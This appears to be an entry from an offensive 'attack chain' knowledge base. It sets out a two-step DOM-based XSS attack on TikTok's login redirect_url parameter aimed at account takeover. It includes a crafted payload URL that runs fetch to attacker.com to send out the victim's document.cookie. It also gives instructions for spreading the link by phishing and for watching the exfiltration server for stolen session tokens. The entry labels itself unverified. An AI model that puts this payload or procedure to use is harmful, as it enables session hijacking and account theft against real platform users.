---
tags:
  - xss
  - dom-xss
  - account-takeover
  - javascript-injection
  - session-theft
type: attack_chain
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-DOM-XSS-in-Redirect-URL]]'
step_count: 2
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:56:03.836Z'
description: >-
  Exploits a DOM-based XSS vulnerability in the redirect_url parameter of
  TikTok's login page to inject and execute arbitrary JavaScript, enabling
  session token theft and account takeover.
skill_level: intermediate
impact_level: high
id: 29fcc476-c558-4dd1-a142-fae4916e1c4d
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# DOM-based XSS in TikTok Login Redirect for Account Takeover

Multi-stage attack chain demonstrating exploitation of a DOM-based XSS vulnerability in TikTok's login redirect_url parameter to achieve arbitrary JavaScript execution and account takeover.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Craft Malicious Redirect URL] --> B[Induce Victim Login]
    B --> C[Execute JavaScript for Token Theft]
    C --> D[Account Takeover]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (relies on browser and URL crafting)

### Target Environment

- Web platform
- Access to TikTok login endpoint (tiktok.com/login)
- No specific ports or services beyond standard HTTPS (443)

### Initial Access Requirements

- Ability to send phishing links to victims (e.g., via email or social engineering)
- No prior credentials needed
- Victim must have a TikTok account and interact with the malicious link

## Detailed Attack Procedures

### Step 1: Craft Malicious Payload
procedure: [[procedures/Exploit-DOM-XSS-in-Redirect-URL]]

**Objective**: Create a redirect_url parameter that injects malicious JavaScript into the DOM upon login page load.

**Instructions**: Construct a URL targeting the vulnerable endpoint with a javascript: scheme in the redirect_url to bypass sanitization and execute JS directly in the victim's browser context.

Example payload URL:

```url
https://tiktok.com/login?redirect_url=javascript:fetch('https://attacker.com/steal?cookie='+document.cookie)
```

Host this on a phishing site or send directly if the victim clicks during login flow.

**Expected Output**: The login page loads, but the redirect_url triggers DOM manipulation, executing the JS to exfiltrate data.

**Success Indicators**:
- Victim accesses the crafted URL
- Browser dev tools show JS execution on page load

### Step 2: Execute and Exfiltrate
procedure: [[procedures/Exploit-DOM-XSS-in-Redirect-URL]]

**Objective**: Leverage the injected JS to steal session tokens and perform unauthorized actions.

**Instructions**: Once the victim logs in via the malicious link, the DOM-based XSS executes. The JS accesses document.cookie to grab session tokens and sends them to an attacker-controlled server.

Monitor your exfiltration endpoint for incoming requests containing stolen cookies.

**Expected Output**: Attacker receives victim's session cookies, allowing replay for account takeover.

**Success Indicators**:
- HTTP requests to attacker server with cookie data
- Ability to access victim's account using stolen tokens

## Attack Chain Summary

### Key Achievements

1. Arbitrary JavaScript execution in victim's browser via unsanitized redirect_url
2. Theft of session tokens leading to full account compromise
3. Potential for further actions like posting unauthorized content or data exfiltration

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Execution]]
- [[Collection]]

---
*Last updated: 2023-10-01T00:00:00Z*
